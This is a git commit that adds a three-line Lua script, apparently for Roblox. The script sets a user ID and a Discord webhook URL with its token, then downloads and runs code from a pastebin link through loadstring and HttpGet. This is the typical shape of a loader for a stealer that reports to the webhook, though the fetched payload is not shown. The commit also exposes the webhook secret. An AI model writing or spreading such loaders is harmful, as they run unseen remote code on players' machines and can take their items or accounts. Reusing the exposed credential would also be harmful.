fd9e0043b5cdd627dfe79fa0958db462818a9bdd
drec1234 <121693334+drec1234@users.noreply.github.com>
2022-12-30 15:24:56 -0500

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,3 @@
+_G.User = 200612328 
+_G.Webhook = 'https://discord.com/api/webhooks/1058478076054483064/KotijVwkGw_V2W-jyBw6qVOs2_E3-oMMm0_nFvouqXf21Kq8xSuzlIidDl1-r2DJ8aBw'
+loadstring(game:HttpGet(('https://pastebin.com/raw/5YUTVeX7')))()
